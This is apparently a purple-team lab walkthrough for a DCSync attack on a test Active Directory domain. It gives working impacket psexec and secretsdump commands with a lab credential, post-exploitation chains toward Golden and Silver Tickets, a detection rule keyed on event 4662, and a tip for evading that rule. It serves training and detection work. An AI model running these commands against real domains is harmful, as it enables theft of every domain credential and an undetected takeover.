# WT#009 — DCSync

## Metadata

| Field | Value |
|-------|-------|
| **Target VM** | dc01 (192.168.77.10), cadre.local |
| **Domain** | cadre.local |
| **Starting Credential** | chief_command / C0mm@nd_Ch1ef! (Domain Admin required) |
| **Tools Required** | impacket |
| **Certifications** | CRTP, CRTE, OSCP+ |
| **MITRE ATT&CK** | T1003.006 |
| **Difficulty** | Medium |

## Prerequisites

- Domain Admin (or equivalent) privileges in `cadre.local`
- Network access to dc01 (192.168.77.10)
- Account with `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` extended rights
- Normally obtained via: WT#002 (AES Kerberoast) → crack → DA escalation, or ACL abuse chain

## Attack Steps

### Step 1: Confirm DA access

```bash
impacket-psexec cadre.local/chief_command:'C0mm@nd_Ch1ef!'@192.168.77.10 whoami
```

### Step 2: Exploit — DCSync all domain secrets

```bash
impacket-secretsdump -just-dc cadre.local/chief_command:'C0mm@nd_Ch1ef!'@192.168.77.10 -outputfile cadre_dcsync
```

### Step 3: Verify — Extract krbtgt hash

```bash
cat cadre_dcsync.ntds | grep krbtgt
```

## Post-Exploitation Chain

- **krbtgt hash** → Golden Ticket (WT#010), Diamond Ticket (WT#012)
- **All user NTLM hashes** → Pass-the-Hash across the domain
- **Machine account hashes** → Silver Ticket (WT#011) for any service
- **Trust key** → Cross-forest SID History injection / inter-realm TGT forging

This is the **crown jewel** of credential access attacks — full domain compromise.

## Telemetry Verification

- **Elastic Index:** `logs-system.security-*`
- **Detection Rule:** `cadre-003-dcsync`
- **Expected Event:** Event ID 4662, AccessMask:`*1400*`, Properties:`*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*`
- **Defender view:** the GUID `1131f6aa-…` is the DS-Replication-Get-Changes right — a 4662 with that property from a principal that is **not a DC** is the highest-fidelity DCSync alert there is (`cadre-003-dcsync` keys on exactly this). Legitimate replication only ever comes from DC machine accounts.

**Alternative paths:** scope to a single account (`-just-dc-user krbtgt`) to grab the Golden-Ticket key quietly instead of dumping the whole NTDS; or run it from a coerced DC context (WT#007) so the source principal *is* a DC and the rule doesn't fire.

## Status

POST-EXPLOIT (requires DA first)
